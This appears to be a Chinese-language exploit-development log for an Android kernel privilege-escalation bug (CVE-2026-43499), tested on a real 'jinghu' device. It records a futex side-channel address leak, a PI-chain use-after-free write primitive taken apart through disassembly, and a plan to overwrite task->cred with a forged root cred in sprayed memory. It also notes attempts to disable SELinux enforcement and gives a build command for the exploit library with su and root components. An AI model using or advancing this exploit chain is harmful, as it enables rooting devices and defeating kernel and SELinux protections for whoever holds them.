# 关键发现汇总

> **★ 2026-07-19 更新提示**: 本文件为 2026-07-18 之前的工作日志, 反映当时视角下的认知。
> 经 2026-07-19 一整轮离线反汇编审计, 部分结论已被深化或纠正, 详见:
> - `p1_code_gap.md` — P1 代码审计 + 真正 blocker 定位
> - `kernelsnitch_task_leak.md` — kernelsnitch 扩展可行性 + spray fake cred 认知纠正
> - `task_struct_leak_survey.md` — 4 条标准通道 (binder/fanotify/inotify/procfs) 全部排除
> - `uhid_gadget_survey.md` — uhid fops 反汇编 + KCFI 约束
>
> 关键认知差异:
> 1. **真正 blocker 是 task_struct 地址未知, 不是 ashmem 墙**: ashmem 只是 configfs_read_once
>    读链的 blocker; cred 直写链路本身真正卡在 `waiter_thread` 的 task_struct 地址必须先泄露
>    (PI 链 target = task + 0x820)。详见上述 4 份报告。
> 2. **spray fake cred 方案**: "写 cred = init_cred" 是
>    简化描述; 实际做法是让 cred 指向 spray 页 fake_w0 内伪造的 cred (内容复制自 init_cred)。
>    参见 findings.md §3 下文 "PI 链方案真相" + README.md "坑 2 / §B 认知纠正"。
> 3. **uhid fops 路线不是任意读银弹**: uhid 可作 PI chain 写入验证, 但 KCFI 拦跨原型 helper,
>    任意读还需另寻路径。详见 `uhid_gadget_survey.md`。
>
> 本文件下方内容保留供历史参考, **不必逐句修订** (与上述新报告冲突处以新报告为准)。

## 1. kernelsnitch 完全工作 (推翻早期判断)

早期日志显示 "KernelSnitch mm_struct leak failed", 误以为 kernelsnitch 在 jinghu 上不工作。

分阶段测试证明 kernelsnitch 完全正常:
```
STAGE 3: kernelsnitch_setup → OK (cpu_count=10)
STAGE 4: clone_leak_child (find_collisions) → OK (child 正常退出)
STAGE 5: bruteforce → OK, 泄露 mm_struct=ffffff80186c5500
```

早期失败是 slab 布局偶发不稳定 (kernelsnitch 有时成功有时失败), 不是必然失败。

kernelsnitch 是纯 futex hash 侧信道, 不依赖任何设备接口 (不需要 /dev/diag)。在 XRing O1 上同样适用。

## 2. configfs_read_once bug (不是 Android 16 修补)

### 反汇编 configfs_bin_read_iter (0xffffffc080488c9c)

CFG_* 偏移验证 (全部正确):
```
CFG_NEEDS_READ_FILL_OFF = 0x50 → [x24+0x50] ✓
CFG_BIN_BUFFER_OFF      = 0x58 → [x24+0x58] ✓
CFG_BIN_BUFFER_SIZE_OFF = 0x60 → [x24+0x60] ✓
CFG_CB_MAX_SIZE_OFF     = 0x64 → [x24+0x64] ✓
```

### configfs_bin_read_iter 逻辑
```
[x24+0x50] (needs_read_fill) != 0 → 调用 read 函数填充 buffer
[x24+0x50] == 0 → 跳到 0xe34, 直接从 buffer 读:
  buffer_size [x24+0x60] <= *ppos → 返回 0
```

### configfs_read_once 设置 (util.c:786)
```c
put32(blob, CFG_NEEDS_READ_FILL_OFF - 11, 0);  // needs_read_fill=0
// 未设 CFG_BIN_BUFFER_OFF / CFG_BIN_BUFFER_SIZE_OFF → 都是 0
// 结果: buffer_size=0 → 返回 0 (pre_rb=0)
```

### 结论
- 这不是 Android 16 修补, 是代码实现 bug
- bug 在 Pixel 上也存在 (同偏移), configfs_read_once 可能从未成功过
- 早期文档 "Android 16 已修补 configfs" 是误判

## 3. PI 链触发成功但写入没成功

### 真机测试日志
```
STAGE 7: PI 链写 selinux_enforcing=0
enforce BEFORE=1 (1=Enforcing)
calling run_main_route_threads...
pselect returned attempt=1 ret=0 errno=0 calls=40 success=40 delay=50000
enforce AFTER=?? (ashmem open 失败导致 exit, 修复后仍 Enforcing)
```

consumer 40 次 sched_setattr 全部成功 (PI 链触发), 但 selinux 仍 Enforcing (写入没生效)。

### 可能原因

rb_insert 写入的值可能是**栈上 waiter 的 pi_tree_entry 地址** (栈地址, 非0), 不是 write_pc。

PI 链 rb_insert 流程:
```
1. fake_task.pi_waiters = fake_w0.pi_tree (根节点)
2. rb_insert 把栈上 waiter 插入 fake_task.pi_waiters
3. 遍历 fake_w0.pi_tree.rb_left = write_left (target-8)
4. 在 target 的子节点位置插入
5. *(target + 0x08) = &栈上waiter.pi_tree  ← 写入值是栈地址?
```

如果写入值是栈地址 (非0), 则:
- *(selinux_enforcing) = 栈地址 (非0) → 仍 Enforcing
- *(task->cred) = 栈地址 (非 init_cred) → 不提权

### 已确认 (反汇编 chain_disasm.txt rt_mutex_adjust_prio_chain @ 0xffffffc081052868)

**写入值 = 栈上 waiter 的 pi_tree_entry 地址, 不是 write_pc!**

```asm
; 行37: x25 = task->pi_blocked_on (UAF 指向栈 waiter)
ffffffc0810528e0: ldr x25, [x19, #0x938]

; 行159-169: 遍历 PI 树, x11 = 父节点 (write_left), x13 = 0/8 (rb_left/rb_right)
ffffffc081052ac8: ldr x12, [x1, #0x8]!      ; x12 = root->rb_left = write_left
ffffffc081052b48: stp x11, xzr, [x25]       ; x25->parent = x11, x25->right = 0
ffffffc081052b4c: str xzr, [x25, #0x10]     ; x25->left = 0
ffffffc081052b50: str x25, [x11, x13]       ; *(x11 + x13) = x25  ← 写入 x25 (栈地址)!
```

x25 = &栈waiter.pi_tree_entry (从 task->pi_blocked_on 取出)。rb_insert 把**栈地址**写到 *(write_left + x13)。

### 写入语义总结

```
*(target - 8 + x13) = &栈waiter.pi_tree_entry   (x13=0 或 8)
```

- 若 x13=8: *(target) = 栈地址 (非0)
- 若 x13=0: *(target-8) = 栈地址

**结论: PI 链写入原语只能写栈地址, 无法直接写 0 或 init_cred。**

### 真机验证 (2026-07-18 STAGE=7, 栈 painting val=0)

```
CMP_REQUEUE_PI ret=1 errno=0        ← requeue ok, UAF 触发
waiter WAIT_REQUEUE_PI ret=0 errno=0 ← ret=0 = UAF 已触发!
stack-painted val=0000000000000000 tgt=ffffffc082315f60  ← 栈 painting 正确 (val=0)
pselect returned attempt=1-8 calls=40 success=40  ← PI 链触发成功
enforce AFTER=1 (仍 Enforcing)     ← 写入没成功 (栈地址非0)
```

### PI 链方案真相 (两次 walk + 伪造 cred)

因为 rb_insert 只能写栈地址, 让 task->pi_blocked_on 指向 spray 页 fake_w0 后的"写 cred"方案实际是:
```
walk#1: *(task->real_cred) = &fake_w0.pi_tree_entry (已知地址, 在 spray 页面)
walk#2: *(task->cred)      = &fake_w0.pi_tree_entry
        其中 fake_w0 页面里伪造了 cred 结构 (uid=0, gid=0, cap=全0)
```

关键是让 task->pi_blocked_on 指向**已知地址的 fake waiter** (spray 页面), 而非栈 waiter。
这样 x25 = &fake_w0.pi_tree_entry (已知), 且 fake_w0 页面可伪造 cred。

### 下一步 (写原语可控化)

1. 让 pi_blocked_on 指向 fake_w0 (spray 页面): 栈 painting 覆盖栈 waiter 的 pi_blocked_on 字段
2. fake_w0 页面伪造 cred 结构 (uid/gid/euid/suid/fsuid/egid/sgid/fsgid=0, cap=0)
3. 两次 walk 写 real_cred/cred 指针槽 = &fake_w0.pi_tree_entry
4. 验证 task uid=0

## 4. ashmem SELinux 拦截

```
/dev/ashmem 权限: crw-rw-rw- root root (666)
但 cat /dev/ashmem: Permission denied
```

DAC (文件权限) 允许, 但 MAC (SELinux) 拒绝 shell 域 open。

影响: configfs 路线完全不可用 (需 ashmem fd)。cred 直写不需要 ashmem, 但读 mm->owner 需要。

## 5. /dev/uhid 可用

```
crw-rw-rw- uhid uhid 10,239 /dev/uhid
```

所有人可读写。uhid 可创建 HID 设备, 可能有内核指针泄露路径。待研究。

## 6. page_base=0 问题

test_minimal STAGE 6 设置 `page_base = prepare_good_kernel_page(...)`, 日志确认 page_base 非0。但 STAGE 7 do_pselect_fake_lock_route 检查时 page_base=0。

原因不明 (可能多线程可见性或编译器优化)。

解决: STAGE 7 重新调 prepare_good_kernel_page 设置 page_base。

## 7. 真机环境

```
设备: 0086207001A00540 (jinghu)
uid=2000(shell) SELinux=Enforcing
内核: 6.6.77-android15-8-g5770c661275f-abogki443185593-4k
shell 组: uhid(3011) readtracefs(3012)
日志: /sdcard/Download/log_*.txt (exploit_log_init 重定向 stdout)
```

## 8. 编译方式

```bash
cd CyberMeowfia/IonStack/CVE-2026-43499/exploit
clang --target=aarch64-linux-android35 --sysroot=$NDK/sysroot \
  -O2 -fPIC -I backup_v1/src \
  -DTARGET_CONFIG_H="targets/jinghu/target.h" \
  backup_v1/src/test_minimal.c backup_v1/src/main.c backup_v1/src/util.c \
  backup_v1/src/slide.c backup_v1/src/fops.c backup_v1/src/pipe.c \
  backup_v1/src/root.c backup_v1/src/su_blob.S backup_v1/src/wallpaper_blob.S \
  -shared -o test_minimal.so -pthread -fuse-ld=lld
```

注意: su_blob.S/wallpaper_blob.S 的 incbin 资源在 CyberMeowfia/exploit 目录下。
